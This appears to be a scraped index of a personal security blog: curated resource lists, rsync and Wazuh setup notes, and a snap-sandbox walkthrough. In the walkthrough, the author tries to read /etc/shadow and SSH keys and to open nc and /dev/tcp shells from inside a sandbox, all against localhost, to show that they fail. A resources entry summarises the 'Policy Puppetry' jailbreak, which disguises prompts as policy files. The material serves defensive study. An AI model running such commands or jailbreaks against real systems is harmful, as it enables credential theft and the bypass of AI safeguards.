(CVE) jungle with ease using CVEMAP, a command-line interface (CLI) tool designed to provide a structured and easily navigable interface to various vulnerability databases.</p> <p>CVEMap CLI is built on top of the CVEMap API that requires API Token from ProjectDiscovery Cloud Platform that can be configured using environment variable named PDCP_API_KEY or using interactive -auth option.</p> <ul> <li>https://github.com/projectdiscovery/cvemap</li> </ul> <p>References within the README:</p> <ul> <li>National Vulnerability Database (NVD): Comprehensive CVE vulnerability data.</li> <li>Known Exploited Vulnerabilities Catalog (KEV): Exploited vulnerabilities catalog.</li> <li>Exploit Prediction Scoring System (EPSS): Exploit prediction scores.</li> <li>HackerOne: CVE discoveries disclosure.</li> <li>Nuclei Templates: Vulnerability validation templates.</li> <li>Trickest CVE / PoC-in-GitHub GitHub Repository: Vulnerability PoCs references.</li> </ul> Google OSV (Open Source Vulnerabilities) <p>An open, precise, and distributed approach to producing and consuming vulnerability information for open source.</p> <p>OSV is a project and service developed by Google. All advisories in this database use the OpenSSF OSV format, which was developed in collaboration with open source communities.</p> <ul> <li>https://osv.dev/</li> <li>https://google.github.io/osv.dev/</li> </ul> Exploit-DB <p><code>searchsploit</code> (https://www.kali.org/tools/exploitdb/) might have different results than the online exploit-db database.</p> <p>The Exploit Database is a CVE compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers. Our aim is to serve the most comprehensive collection of exploits gathered through direct submissions, mailing lists, as well as other public sources, and present them in a freely-available and easy-to-navigate database. The Exploit Database is a repository for exploits and proof-of-concepts rather than advisories, making it a valuable resource for those who need actionable data right away.</p> <ul> <li>https://www.exploit-db.com/</li> </ul> GitHub Advisory Database <p>Security vulnerability database inclusive of CVEs and GitHub originated security advisories from the world of open source software.</p> <ul> <li>https://github.com/advisories</li> </ul> Ubuntu Security Notices <p>Developers issue an Ubuntu Security Notice when a security issue is fixed in an official Ubuntu package.</p> <p>To report a security vulnerability in an Ubuntu package, please contact the Security Team.</p> <p>The Security Team also produces OVAL files for each Ubuntu release. These are an industry-standard machine-readable format dataset that contain details of all known security vulnerabilities and fixes relevant to the Ubuntu release, and can be used to determine whether a particular patch is appropriate. OVAL files can also be used to audit a system to check whether the latest security fixes have been applied.</p> <ul> <li>https://ubuntu.com/security/notices</li> </ul> Red Hat Bugzilla <p>Here you can search the entirety of Red Hat's Bugzilla instance for security notices or fixes. This isn't limited to just RHEL, but any project tracked here. For example, set the \"Product\" to <code>Fedora</code> and \"Summary contains all of the strings\" to <code>CVE</code> and sort results by \"Last Changed\" to see the latest issues being addressed and their current state.</p> <ul> <li>https://bugzilla.redhat.com/query.cgi?format=advanced</li> </ul> Google Project Zero <p>Zero day and exploit research.</p> <ul> <li>https://googleprojectzero.blogspot.com/</li> </ul> snyk.io (Vulnerability Database) <ul> <li>https://security.snyk.io</li> </ul> wpscan (Vulnerability Database) <ul> <li>https://wpscan.com/wordpresses/</li> <li>https://wpscan.com/themes</li> <li>https://wpscan.com/plugins</li> </ul> Vulners (nmap NSE script) <p>For each available CPE the script prints out known vulns (links to the correspondent info) and correspondent CVSS scores.</p> <ul> <li>https://nmap.org/nsedoc/scripts/vulners.html</li> </ul>"},{"location":"blog/2019/07/15/-resources/#malware-research","title":"Malware Research","text":"VirusTotal <p>The ultimate resource for malware information, connections, and behavior.</p> <p>The VT API has a 500 requests per day, 4 per minute limit.</p> <ul> <li>https://www.virustotal.com/</li> </ul> abuse.ch <p>Independent, community-driven cyber threat intelligence.</p> <ul> <li>https://abuse.ch/</li> <li>https://bazaar.abuse.ch/ (live malware samples)</li> <li>https://urlhaus.abuse.ch/</li> </ul> ANY.RUN <p>Cloud-based live malware analysis.</p> <ul> <li>https://app.any.run/</li> </ul> URLScan <p>Third-party URL scanning.</p> <p>urlscan.io is a free service to scan and analyse websites. When a URL is submitted to urlscan.io, an automated process will browse to the URL like a regular user and record the activity that this page navigation creates. This includes the domains and IPs contacted, the resources (JavaScript, CSS, etc) requested from those domains, as well as additional information about the page itself. urlscan.io will take a screenshot of the page, record the DOM content, JavaScript global variables, cookies created by the page, and a myriad of other observations. If the site is targeting the users one of the more than 900 brands tracked by urlscan.io, it will be highlighted as potentially malicious in the scan results.</p> <p>urlscan.io itself is a free service, but we also offer commercial products for heavy users and organisations that need additional insight.</p> <ul> <li>https://urlscan.io</li> </ul> GREYNOISE <p>GreyNoise empowers your security team to work on the most urgent and critical threats without being overwhelmed by noisy, low-priority alerts. We provide real-time, verifiable threat intelligence powered by a global network of proprietary sensors.</p> <p>The API has a 50 searches per week limit.</p> <ul> <li>https://viz.greynoise.io/</li> <li>https://docs.greynoise.io/docs/using-the-greynoise-community-api</li> </ul> vxunderground <p>A collection of malware samples, code, and research.</p> <ul> <li>https://github.com/vxunderground/MalwareSourceCode</li> <li>https://github.com/vxunderground/ThreatIntelligenceDiscordBot</li> </ul> theZoo <p>theZoo is a project created to make the possibility of malware analysis open and available to the public.</p> <ul> <li>https://github.com/ytisf/theZoo</li> </ul> Joe Security / JoeSandbox <ul> <li>https://github.com/joesecurity</li> <li>https://www.joesecurity.org/</li> </ul> PhishTank <p>PhishTank is a collaborative clearing house for data and information about phishing on the Internet. Also, PhishTank provides an open API for developers and researchers to integrate anti-phishing data into their applications at no charge.</p> <ul> <li>https://www.phishtank.com</li> <li>https://www.phishtank.com/faq.php</li> </ul>"},{"location":"blog/2019/07/15/-resources/#cryptocurrency","title":"Cryptocurrency","text":"Trezor Wallet <p>Trezor is a physical hardware wallet for cryptocurrency. These devices also have other functionality, such as U2F, FIDO, and WebAuth.</p> <ul> <li>https://trezor.io/</li> <li>https://docs.trezor.io/</li> </ul> <p>The easiest way to use a Trezor hardware wallet is through the Trezor Suite. Download the Trezor suite AppImage (recommended) and check the signatures:</p> <ul> <li>https://github.com/trezor/trezor-suite/releases</li> <li>Trezor signing key via trezor.io</li> <li>Trezor signing key on the Ubuntu Keyserver</li> </ul> <pre><code>pub   rsa4096/0xE21B6950A2ECB65C 2021-01-04 [SC]\n    Key fingerprint = EB48 3B26 B078 A4AA 1B6F  425E E21B 6950 A2EC B65C\nuid                             SatoshiLabs 2021 Signing Key\n</code></pre> <p>Or access the web version here:</p> <ul> <li>https://suite.trezor.io/web</li> <li>Chrome (web-USB or <code>trezord</code>) or Firefox only</li> <li><code>trezord</code> is a local daemon that was required when only the web version existed</li> </ul> <p>Install udev rules for the hardware wallet's usb connection: 51-trezor.rules</p> <pre><code>sudo cp 51-trezor.rules /etc/udev/rules.d/\nsudo udevadm control --reload\n</code></pre> <p>For reference, Yubico's udev rules with Trezor are here: 70-u2f.rules</p> <p>Next, you'll likely need to install the previous FUSE binaries.</p> <ul> <li>https://github.com/appimage/appimagekit/wiki/fuse</li> </ul> <pre><code>sudo add-apt-repository universe\n\n# 24.04 and later\nsudo apt install libfuse2t64\n\n# 22.04 and earlier\nsudo apt install fuse libfuse2\n\nsudo modprobe fuse\nsudo groupadd fuse\n\nuser=\"$(whoami)\"\nsudo usermod -a -G fuse $user\n\nsudo systemctl reboot\n</code></pre> <p>If you have usbguard running, when updating the Trezor wallet's firmware, you'll need to \"add\" it again in the policy list. When the device reboots into bootloader mode for updates, its characteristics change. To usbguard this is a different device.</p> <pre><code>usbguard list-devices\nsudo usbguard allow-device &lt;id&gt; -p\n</code></pre>"},{"location":"blog/2019/07/15/-resources/#artificial-intelligence","title":"Artificial Intelligence","text":"<p>OWASP AI Exchange</p> <p>The OWASP AI Exchange is a collection of projects related to AI privacy and security. The testing resources are similar to the OWASP Top 10, but for AI.</p> <ul> <li>https://owaspai.org/</li> <li>https://github.com/OWASP/www-project-ai-security-and-privacy-guide</li> <li>AI Security Testing</li> </ul>"},{"location":"blog/2019/07/15/-resources/#tools","title":"Tools","text":"ollama <p>Get up and running with Llama 3.3, DeepSeek-R1, Phi-4, Gemma 3, Mistral Small 3.1 and other large language models.</p> <ul> <li>https://github.com/ollama/ollama</li> <li>https://ollama.com/</li> <li>Documentation</li> </ul> <p>ollama was showcased in Keeping Things Local - Making Your Own Private LLM w/ Bronwen Aker. It's incredibly easy to get started, and have a local LLM running without a ton of resources.</p> <p>Think of ollama as a CLI frontend with access to a repo of vetted LLM's. This is different from Hugging Face, which is not a frontend, but is more like GitHub (the wild west).</p> <p>Essentially, you can download and run models, customize them fairly quickly and easily using files similar to Daniel Miessler's fabric patterns, and through RAG (retrieval-augmented generation) contextualize them around a local set of files or data.</p> <p>All of this was learned from Bronwen's presentation.</p> Keeping Things Local - Making Your Own Private LLM w/ Bronwen Aker <ul> <li>https://www.youtube.com/watch?v=DbzkJRl_xnk</li> <li>Slides</li> </ul> <p>This is a full walkthrough of how to do this yourself, put together by Bronwen over at BHIS. It's straight forward and easy to understand if you're looking to get started with local LLM's.</p> <ul> <li>ollama is essentially a frontend to interface with and retrieve vetted LLM's</li> <li>Hugging Face is more like GitHub, and not every model is vetted, however official models from trusted sources are available there as well</li> <li>The resoure requirements aren't high, WSL can run these too since Windows passes the GPU through</li> <li>It's easy to customize a model</li> <li>RAG (retrieval-augmented generation) is the process of referencing documents and data without re-training a model (which is expensive and hard)</li> </ul> fabric <p>fabric is an open-source framework for augmenting humans using AI. It provides a modular framework for solving specific problems using a crowdsourced set of AI prompts that can be used anywhere.</p> <ul> <li>https://github.com/danielmiessler/fabric</li> <li>Patterns</li> </ul> <p>The pattern files are raw markdown that provide context to each query you make.</p> <p>The Keeping Things Local - Making Your Own Private LLM w/ Bronwen Aker demo was a reminder of this. It works not only with external API-based services, but also local LLM's.</p> Google Gemini <p>Google's AI model (previously known as Bard). As of March 2025 it ranks the highest of any model for coding.</p> <ul> <li>https://gemini.google.com</li> <li>Gemini Apps Privacy Hub</li> </ul> <p>If you don't want your input and output to be used for training or human review, you can turn off Gemini Apps Activity. This does not delete past data. As with any AI assume any inputs or outputs may become public or used for training.</p> <p>Gemini is usable within Google Workspace. According to their policy it will not share or train on input or output of emails, documents, or otherwise unless you decide to allow that.</p> <p>Other interesting features include:</p> <ul> <li>NotebookLM: Process text, PDFs, Google Docs, websites, and more into summaries that include a podcast-like audio conversation about the content</li> <li>Sec-Gemini is built to augment SOC workflows with Mandiant and OSV data</li> </ul> OpenAI <p>Possibly the most popular general-use AI. It's capable of text and audio conversation, coding, image and video generation and editing. There's also web search, deep research, and scheduled tasks.</p> <ul> <li>https://openai.com/</li> <li>https://chatgpt.com/</li> <li>https://sora.com/</li> </ul> <p>If you don't want your input and output to be used for training or shared to the explore feed in Sora, you can turn this off in the settings of both ChatGPT and Sora, where they're on by default. As with any AI assume any inputs or outputs may become public or used for training.</p> Cloudflare: AI Labyrinth <p>...we decided to use a new offensive tool in the bot creator's toolset that we haven't really seen used defensively: AI-generated content. When we detect unauthorized crawling, rather than blocking the request, we will link to a series of AI-generated pages that are convincing enough to entice a crawler to traverse them. But while real looking, this content is not actually the content of the site we are protecting, so the crawler wastes time and resources.</p> <p>As an added benefit, AI Labyrinth also acts as a next-generation honeypot. No real human would go four links deep into a maze of AI-generated nonsense. Any visitor that does is very likely to be a bot, so this gives us a brand-new tool to identify and fingerprint bad bots, which we add to our list of known bad actors. Here's how we do it...</p> <ul> <li>https://blog.cloudflare.com/ai-labyrinth/</li> </ul>"},{"location":"blog/2019/07/15/-resources/#attacks","title":"Attacks","text":"The Policy Puppetry Attack <p>The attacks in this blog leverage the Policy Puppetry Attack, a novel prompt attack technique created by HiddenLayer researchers. By reformulating prompts to look like one of a few types of policy files, such as XML, INI, or JSON, an LLM can be tricked into subverting alignments or instructions. As a result, attackers can easily bypass system prompts and any safety alignments trained into the models. Instructions do not need to be in any particular policy language. However, the prompt must be written in a way that the target LLM can interpret as policy. To further improve the attack's strength, extra sections that control output format and/or override specific instructions given to the LLM in its system prompt can be added.</p> <ul> <li>https://hiddenlayer.com/innovation-hub/novel-universal-bypass-for-all-major-llms/</li> </ul> <p>Discovered on https://securityweekly.com/swn-471.</p>"},{"location":"blog/2019/07/15/-resources/#blogs-authors","title":"Blogs &amp; Authors","text":"Daniel Miessler <p>Building AI that upgrades humans.</p> <ul> <li>https://danielmiessler.com/</li> <li>https://github.com/danielmiessler/fabric</li> <li>https://github.com/danielmiessler/SecLists</li> </ul> tcm-sec (TheCyberMentor) <p>Training, tutorials, and all things infosec.</p> <ul> <li>https://www.youtube.com/c/TheCyberMentor</li> <li>https://github.com/TCM-Course-Resources</li> </ul> Husky Hacks <ul> <li>https://github.com/HuskyHacks</li> <li>https://notes.huskyhacks.dev/notes</li> </ul> OA Labs <p>Malware analysis and reverse engineering.</p> <ul> <li>https://www.twitch.tv/oalabslive</li> <li>https://github.com/OALabs</li> <li>https://www.unpac.me/#/ (automated unpacking service)</li> </ul> Malware Unicorn <ul> <li>https://github.com/malware-unicorn</li> <li>https://malwareunicorn.org/#/</li> </ul> maldev-for-dummies <p>A malware development course.</p> <ul> <li>https://github.com/chvancooten/maldev-for-dummies</li> </ul> Josh Stroschein (CyberYeti) <p>Malware analysis and reverse engineering.</p> <ul> <li>https://github.com/jstrosch</li> <li>https://www.youtube.com/@jstrosch</li> </ul> S1REN <ul> <li>https://sirensecurity.io/blog/linux-privilege-escalation-resources/</li> <li>https://sirensecurity.io/blog/windows-privilege-escalation-resources/</li> </ul> 13Cubed (Richard Davis DFIR) <ul> <li>https://www.youtube.com/c/13cubed/featured</li> <li>https://www.13cubed.com/</li> <li>https://github.com/13Cubed</li> </ul> Hal Pomeranz <ul> <li>https://github.com/halpomeranz</li> <li>https://righteousit.com/author/halpomeranz/ (Blog)</li> <li>https://archive.org/search?query=creator%3A%22Hal+Pomeranz%22 (Training materials released on archive.org)</li> <li>Hiding Linux Processes with Bind Mounts</li> <li>Systemd Timers</li> </ul> IppSec <ul> <li>https://www.youtube.com/c/ippsec/</li> <li>https://ippsec.rocks (YouTube video topic search)</li> </ul> Security Weekly <p>AKA Paul's Security Weekly.</p> <ul> <li>https://securityweekly.com/</li> </ul> SANS <p>The ISC Daily StormCast is a great way to digest daily news with links to tools and sources.</p> <ul> <li>https://isc.sans.edu/</li> </ul> NSA <p>National Security Agency.</p> <ul> <li>https://www.nsa.gov/news-features/</li> <li>https://github.com/nsacyber/</li> <li>https://github.com/nsacyber/Hardware-and-Firmware-Security-Guidance</li> </ul> Schneier <p>Bruce Schneier's security blog is a great way to digest daily news with links to research and sources.</p> <ul> <li>https://www.schneier.com/</li> </ul> Reversing Labs <ul> <li>Malicious ML models discovered on Hugging Face platform</li> </ul> p0dalirius <p>Security researcher and author of a number of very popular pentesting tools.</p> <ul> <li>https://github.com/p0dalirius</li> </ul> mobile-hacker <p>Discovered on Paul's Security Weekly #864. mobile-hacker's tutorials have excellent DIY guides for on-the-go projects using Raspberry Pi's, Android, and more.</p> <ul> <li>Portable Kali on Raspberry Pi with Touchscreen</li> </ul> AI for Humans <p>Randomly discovered while looking for shows to cover AI news. This is a comedy show that packs a lot of the weekly news into an hour with links to tools and examples.</p> <ul> <li>https://www.aiforhumans.show/</li> </ul>"},{"location":"blog/2025/02/22/material-sync-circle-rsync/","title":"rsync","text":"<p>The fast, versatile, remote (and local) file-copying tool. It operates using deltas and by looking at properties to only update parts of files that have changed, making it incredibly efficient and invaluable as a part of a regular or scheduled backup operation. I have used this tool to ensure local, remote, and external copies of directories are in sync, or to identify what has changed.</p>"},{"location":"blog/2025/02/22/material-sync-circle-rsync/#practical-examples","title":"Practical Examples","text":""},{"location":"blog/2025/02/22/material-sync-circle-rsync/#rsync-from-host-to-dev-vm","title":"rsync from Host to Dev VM","text":"<p>First obtain the IP address of the VM.</p> QEMUHyper-V <pre><code># Tab completion of vm-name works\nvirsh domifaddr &lt;vm-name&gt;\n</code></pre> <pre><code># TO DO\n</code></pre> <p>Then execute the commands either as a bash script or through bash itself to perform the following:</p> <ul> <li><code>-arv</code> archives permissions and unix file properties, recursively, and is verbose about rsync operations</li> <li><code>--delete</code> will remove any files or data in the dest path that are no longer present in the src path</li> <li><code>--safe-links</code> will not follow symlinks pointing outside of the tree</li> <li><code>--exclude='&lt;string&gt;'</code> can be used multiple times to ignore any files and folders with <code>&lt;string&gt;</code> in their path</li> <li><code>-e \"&lt;ssh-args&gt;\"</code> can be used to make additional SSH arguments, in the example below, jump across a firewall VM</li> </ul> <p>Ultimately this will sync the folders <code>straysheep-dev.github.io</code>, <code>packer-configs</code>, and <code>ansible-configs</code> to <code>/home/user1/src/</code> on the remote machine. Without trailing slashes, the folders themselves are sync'd. If you included trailing slashes on the source paths, the contents of the folders would be sync'd. This would put the contents of all three folders into <code>~/src</code> on the remote machine, instead of keeping them in separate folders.</p> <pre><code>rsync -arv \\\n--delete \\\n--safe-links \\\n--exclude='.git/' \\\n--exclude='.cache' \\\n-e \"-J admin@&lt;firewall-vm-ip&gt;:2222\" \\\n./straysheep-dev.github.io \\\n./packer-configs \\\n./ansible-configs \\\nuser1@&lt;vm-ip&gt;:/home/user1/src/\n</code></pre>"},{"location":"blog/2024/05/07/simple-snapcraft-snap/","title":"snap","text":"<p>Notes related to the snap package manager.</p> <p>This file is originally from straysheep-dev/linux-configs.</p>"},{"location":"blog/2024/05/07/simple-snapcraft-snap/#snap-security","title":"Snap Security","text":"<p>A quick overview of the security behind <code>snap</code> packages.</p>"},{"location":"blog/2024/05/07/simple-snapcraft-snap/#application-integrity","title":"Application Integrity","text":"<p>If you download a snap with <code>snap download &lt;package-name&gt;</code> you will get two files:</p> File Description <code>&lt;package-name&gt;.snap</code> The snap application itself <code>&lt;package-name&gt;.assert</code> Plain text file containing mulitple signatures required to validate the integrity of the .snap file <p>This is a good way of archiving or backing up specific versions of snap packages.</p> <p>Install the snap package with:</p> <pre><code>sudo snap ack &lt;package-name&gt;.assert\nsudo snap install ./&lt;package-name&gt;.snap\n</code></pre> <p>Any attempt to modify or tamper with the <code>.assert</code> file will result in snapd failing to acknowledge those signatures, ultimately preventing the install of that <code>.snap</code> package.</p>"},{"location":"blog/2024/05/07/simple-snapcraft-snap/#runtime-isolation","title":"Runtime Isolation","text":"<p>Snap packages are isolated, almost like chroot jails, in that they cannot access / read anything owned by <code>root</code>, or anything belonging to another <code>snap</code> within <code>/snap</code> or <code>~/snap</code> as well as any <code>.hidden</code> files and directories (among other optional / user defined locations and resources).</p> <p>They also have limited access to binaries available on the host.</p> <p>NOTE: This can create issues with screensharing windows of other snap applications while conferencing.</p> <p>It's always recommended to run your browser in some form of additional system level sandbox (snap or flatpak for example) due to the nature of web-based threats. Windows does this in Microsoft Edge with Application Guard. This opens any resources defined as untrusted to your organization in a temporary Hyper-V container, essentially a temporary VM to further isolate those processes from the host in addition to a number of other protections.</p> <p>In the case of snaps, sharing windows of other snap applications is no longer possible due to the sandbox (which is both good and bad). You can share your entire screen, which is not always the best option. However if your other applications are not snap or flatpak applications, there's no issue sharing these windows via a snap-based web browser.</p> <p>One trick is opening a separate browser tab as it's own window, and opening the files you need to share in that browser tab while sharing that window.</p> <p>Additionally with many resources being web based, it's likely you have the files stored with a cloud provider. Sharing a folder of specific files in a single browser tab window like this can also work well.</p>"},{"location":"blog/2024/05/07/simple-snapcraft-snap/#exceptions-to-isolation","title":"Exceptions to Isolation","text":"<p>Any package that requires the <code>--classic</code> argument during install will NOT be sandboxed, and is exactly like a traditional <code>.deb</code> package installed with <code>apt</code>.</p>"},{"location":"blog/2024/05/07/simple-snapcraft-snap/#reviewing-isolation","title":"Reviewing Isolation","text":"<p>To visualize how the runtime isolation works we can open shells in the context of snap applications, as if we were an attacker that compromised a particular snap application's process:</p> <pre><code>$ snap run --shell firefox\nTo run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".\nSee \"man sudo_root\" for details.\n\n$ pwd\n~/\n\n$ whoami\nbash: /usr/bin/whoami: Permission denied\n\n$ sudo -l\nbash: /usr/bin/sudo: Permission denied\n\n$ cat /etc/shadow\ncat: /etc/shadow: Permission denied\n\n$ cat ~/.ssh/id_rsa\ncat: ~/.ssh/id_rsa: Permission denied\n</code></pre> <p>We can limit what snaps can access, for example to block access to the entire home directory:</p> <pre><code>$ echo 'test' &gt; ~/Documents/read.txt\n\n$ snap run --shell firefox\n\n$ cat ~/Documents/read.txt\ntest\n\n$ exit\nexit\n\n$ sudo snap disconnect firefox:home\n[sudo] password for user:\n\n$ snap run --shell firefox\n\n$ cat ~/Documents/read.txt\ncat: read.text: Permission denied\n</code></pre> <p>In the above case, you would save downloads directly to the ~/snap/firefox/* directories instead of ~/Downloads.</p> <p>Next, we'll look at network connections.</p> <p>Elements from this section largely come from HackTricks:</p> <p>https://github.com/carlospolop/hacktricks/blob/master/linux-unix/useful-linux-commands/bypass-bash-restrictions.md</p> <pre><code>$ nc -nvlp 8080\nListening on 0.0.0.0 8080\n\n# Checking listening ports from another shell\n$ sudo ss -anp -A inet\ntcp  LISTEN   0   1    0.0.0.0:8080    0.0.0.0:*     users:((\"nc\",pid=1234,fd=3))\n\n# Connecting via curl from another shell\nConnection received on 127.0.0.1 50482\nGET / HTTP/1.1\nHost: 127.0.0.1:8080\nUser-Agent: curl/7.68.0\nAccept: */*\n\n# Connecting out to another resource\n$ nc -nv 127.0.1.1 8080\nConnection to 127.0.1.1 8080 port [tcp/*] succeeded!\n\n$ exit\nexit\n</code></pre> <p>Now we'll remove network access from the application:</p> <pre><code># Disconnecting network access\n$ sudo snap disconnect firefox:network\n[sudo] password for user:\n\n$ snap run --shell firefox\nTo run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".\nSee \"man sudo_root\" for details.\n\n# Try to open a listener\n$ nc -nvlp 8080\nbash: /usr/bin/nc: Permission denied\n\n# Try to connect to a listener\n$ nc -nv 127.0.1.1 8080\nbash: /usr/bin/nc: Permission denied\n\n$ (sh)0&gt;/dev/tcp/127.0.1.1/8080\nbash: socket: Permission denied\nbash: /dev/tcp/127.0.1.1/8080: Permission denied\n\n# Try another connection\n$ python3 -c 'import pty; pty.spawn(\"/bin/sh\")' ; nc -nv 127.0.1.1 8080\n\n$ nc -nv 127.0.1.1 8080\n/bin/sh: 3: nc: Permission denied\n\n$ exit\nbash: /usr/bin/nc: Permission denied\n</code></pre> <p>Interestingly with snap you can enumerate whether or not a local resource exists:</p> <pre><code>$ cat /etc/ufw/user.rules\ncat: /etc/ufw/user.rules: Permission denied\n\n$ cat /etc/ufw/user.rulesbutnotreally\ncat: /etc/ufw/user.rulesbutnotreally: No such file or directory\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/","title":"Wazuh all your things with Tailscale","text":"<p>This guide shows you how to get a Wazuh instance running over Tailscale on both Windows and Linux, using Sysmon(+forLinux), auditd, and all the tweaks you'll want to get started. This is ideal for a low resource, low budget, or lab scenario. You could eventually migrate this Wazuh data to a distributed cluster (proxmox), or real hardware if you grow with it.</p> <p>Overview</p> <ul> <li>\ud83c\udf10 Creating a tailnet, defining an ACL policy, connecting machines using tags</li> <li>Installing Ubuntu Server + Wazuh on a Hyper-V VM<ul> <li>\ud83c\udf10 Shell script installer</li> <li>\ud83c\udf10 wazuh-ansible installation method (based on tag of latest stable version)</li> <li>\ud83c\udf10 Docker</li> </ul> </li> <li>Applying and maintaining the CIS L2 benchmark using ansible tags</li> <li>Ingesting logs: 3 components</li> <li>Reading and understanding logs</li> <li>How to write a custom integration, including a ready-to-use Discord integration for shipping alerts</li> </ul>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#tailnet-access","title":"Tailnet Access","text":"<p>Create a Tailscale account if you already don't have one (it's free for up to 3 users and 100 devices).</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#defining-acls-and-tags","title":"\ud83c\udff7\ufe0f Defining ACLs and Tags","text":"<p>This allows agents to communicate with ports on the manager node(s), but nothing else in your tailnet, not even other endpoints.</p> <p>Tailnet ACLs</p> <p>Tailscale's ACL rules work on a default-deny-all policy. You must define what can talk to what.</p> <pre><code>    // Define the tags which can be applied to devices and by which users.\n    \"tagOwners\": {\n        &lt;SNIP&gt;\n        \"tag:wazuh-agent\": [\"autogroup:admin\"],\n        \"tag:wazuh-node\":  [\"autogroup:admin\"],\n    },\n    \"acls\": [\n    &lt;SNIP&gt;\n        // Allow Wazuh agents to communicate with Wazuh nodes\n        {\n            \"action\": \"accept\",\n            \"src\":    [\"tag:wazuh-agent\"],\n            \"dst\":    [\"tag:wazuh-node:1514,1515,55000\"],\n        },\n    ],\n    &lt;SNIP&gt;\n</code></pre> <p>Be sure your Wazuh nodes ingesting data also have their firewalls open on tcp/1515 tcp/1514 tcp/55000 for their tailnet interface only.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#tagging-devices","title":"\ud83c\udff7\ufe0f Tagging Devices","text":"<p>This can be done when generating an authkey, or once a device is already in your tailnet.</p> <p>If you've already enrolled some endpoints, and have an existing tailnet, you can add a tag to them from the Tailnet dasboard.</p> <ul> <li>Click the <code>...</code> three dots</li> <li>Choose <code>Edit ACL Tags...</code></li> <li>Choose <code>Add tags</code>, or go to <code>Manage tags in Access Controls</code> if you haven't created tags yet</li> <li>Create a tag called something like <code>wazuh-agent</code> (it can be anything, but has to match what's in your ACLs)</li> <li>Create another tag called <code>wazuh-node</code> for the server components (this tag could be used on each server component if they're distributed)</li> </ul> <p></p> <p>If you're still enrolling more endpoints, tag your auth keys as either <code>wazuh-node</code> or <code>wazuh-agent</code>.</p> <ul> <li><code>Settings</code> &gt; <code>Keys</code> &gt; <code>Generate auth key ...</code></li> <li>Tag:<code>wazuh-node</code> for server components or Tag:<code>wazuh-agent</code> for endpoints</li> </ul>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#manager-vm-requirements","title":"Manager VM Requirements","text":"<p>Check the Quick Start first.</p> <p>A headless server is the ideal environment for Wazuh to live for performance sake, even in a lab scenario. To avoid any exposed web interfaces, use SSH local portforwarding to access the Wazuh manager dashboard after installing it. So your localhost:8443 can reach the Wazuh node's localhost:443 to login.</p> <pre><code>ssh -L 127.0.0.1:8443:127.0.0.1:443 user@wazuh-ip\n</code></pre> <ul> <li>Ubuntu 22.04 Server</li> <li>80 GB Disk Space (50GB for logs, 30GB for OS)</li> <li>4 vCPU</li> <li>8 GiB RAM (will exceed 8 if you run this with a GUI)</li> </ul>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#get-an-iso","title":"Get an ISO","text":"<p>Grab the latest server image and signatures.</p> <pre><code>url_list='\nhttps://releases.ubuntu.com/jammy/SHA256SUMS\nhttps://releases.ubuntu.com/jammy/SHA256SUMS.gpg\nhttps://releases.ubuntu.com/jammy/ubuntu-22.04.4-live-server-amd64.iso\n'\n\nfor remote_file in $url_list\ndo\n    curl -LfO \"$remote_file\"\ndone\n\ngpg --verify SHA256SUMS.gpg SHA256SUMS || exit 1\nsha256sum -c SHA256SUMS --ignore-missing || exit 1\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#install-the-os-hyper-v","title":"Install the OS (Hyper-V)","text":"<p>Hyper-V</p> <p>This guide uses Hyper-V, since it's less often covered than VMware and VirtualBox, which are heavily documented and more beginner friendly.</p> <p>If Hyper-V isn't already enabled on your system, enable it.</p> <pre><code># Run as administrator\nEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All\nshutdown.exe /t 0 /r\n</code></pre> <p>Once rebooted, you're ready to continue:</p> <ul> <li>Run Hyper-V Manager as admin (search for Hyper-V manager in the Start Menu)</li> <li>Right-Click your hostname in the Hyper-V Manger window, New &gt; Virtual Machine...</li> <li>Name: Wazuh</li> <li>Check \"Store in a different location\"</li> <li><code>PS&gt; mkdir \"C:\\ProgramData\\Microsoft\\Windows\\Hyper-V\\Virtual Machines\\Wazuh\"</code></li> <li>Select this folder</li> <li>Choose \"Next\"</li> <li>Select \"Generation 2\"</li> <li>Startup memory: 8192, leave \"Use Dynamic Memory\" checked</li> <li>Choose \"Next\"</li> <li>Connection: \"CustomNATSwitch\" (which you should create if you're doing a lot with Hyper-V and home labs)</li> <li>Choose \"Next\"</li> <li>Create a virtual hard disk, set the Location: <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V\\Virtual Machines\\Wazuh\\</code></li> <li>Choose \"Next\"</li> <li>Choose Install an operating system later</li> <li>Choose \"Next\", then \"Finish\"</li> </ul> <p>Custom NAT Switch</p> <p>A custom NAT switch solves a lot of problems in Hyper-V networking.</p> <ul> <li>The default Hyper-V network \"regenerates\" every time you reboot, so it's considered a new interface</li> <li>This is an issue if you have strict firewall rules on the host (AllowInboundRules: False)</li> <li>If you do set AllowInboundRules: False (which is generally a good idea) this will also break DHCP</li> </ul> <p>With a custom switch, while you can only have one custom NAT switch per host, it's persistent, you define the IP range, and firewall rules persist. If you configure WSL to talk to this internal IP range, it will continue to work</p> <p>Make the custom NAT switch:</p> <pre><code>New-VMSwitch -SwitchName \"CustomNATSwitch\" -SwitchType Internal\n$ifindex = (Get-NetAdapter -IncludeHidden | where { $_.Name -eq \"vEthernet (CustomNATSwitch)\" }).ifIndex\nNew-NetIPAddress -IPAddress 10.55.55.1 -PrefixLength 24 -InterfaceIndex $ifindex\nNew-NetNat -Name CustomNATNetwork -InternalIPInterfaceAddressPrefix 10.55.55.0/24\n</code></pre> <p>If you want WSL to be able to reach this switch, allow both interfaces to forward packets:</p> <pre><code># Apply\nGet-NetIPInterface | where {$_.InterfaceAlias -eq 'vEthernet (WSL (Hyper-V firewall))' -or $_.InterfaceAlias -eq 'vEthernet (CustomNATSwitch)'} | Set-NetIPInterface -Forwarding Enabled\n\n# Remove\nGet-NetIPInterface | where {$_.InterfaceAlias -eq 'vEthernet (WSL (Hyper-V firewall))' -or $_.InterfaceAlias -eq 'vEthernet (CustomNATSwitch)'} | 